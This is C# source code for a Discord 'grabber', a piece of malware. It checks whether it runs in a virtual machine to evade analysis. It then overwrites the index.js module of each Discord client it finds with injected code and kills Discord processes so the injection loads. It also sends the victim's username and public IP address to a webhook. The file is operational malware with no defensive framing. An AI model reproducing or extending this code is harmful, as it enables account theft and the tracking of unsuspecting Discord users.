using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;

namespace Furious
{
    public class Grabber
    {
		public static bool CheckForVM()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
			}
			return false;
		}

		public static void Start(bool grabIP)
		{
			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discord"))
			{
				string[] discord = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Discord");
				foreach (string text in discord)
				{
					if (text.Contains("0."))
					{
						FileManagement.DiscordPath = text + "\\modules\\discord_modules\\index.js";
						FileManagement.CleanFile(FileManagement.DiscordPath);
						FileManagement.WriteDiscord(FileManagement.DiscordPath);
					}
				}
				if (grabIP)
				{
					SendIP();
				}
			}
			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordptb"))
			{
				string[] ptb = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordptb");
				foreach (string text2 in ptb)
				{
					if (text2.Contains("0."))
					{
						FileManagement.PTBPath = text2 + "\\modules\\discord_modules\\index.js";
						FileManagement.CleanFile(FileManagement.PTBPath);
						FileManagement.WriteDiscord(FileManagement.PTBPath);
					}
				}
				if (grabIP)
				{
					SendIP();
				}
			}
			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordcanary"))
			{
				string[] canary = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discordcanary");
				foreach (string text3 in canary)
				{
					if (text3.Contains("0."))
					{
						FileManagement.CanaryPath = text3 + "\\modules\\discord_modules\\index.js";
						FileManagement.CleanFile(FileManagement.CanaryPath);
						FileManagement.WriteDiscord(FileManagement.CanaryPath);
					}
				}
				if (grabIP)
				{
					SendIP();
				}
			}
			CloseProcesses();
		}

		private static void CloseProcesses()
		{
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName.ToLower().Contains("discord"))
				{
					process.Kill();
				}
			}
		}

		private static string GrabIP()
		{
			string result;
			using (WebClient webClient = new WebClient())
			{
				result = webClient.DownloadString("https://ipv4.icanhazip.com/");
			}
			return result;
		}

		public static void SendIP()
		{
			string hook = "webhook-here";

			using (HttpClient httpClient = new HttpClient())
			{
				try
				{
					httpClient.PostAsync(hook, new StringContent(Environment.UserName + ": " + Grabber.GrabIP()));
				}
				catch (HttpRequestException ex)
				{
					Debug.Write(ex.Message);
				}
			}
		}
	}
}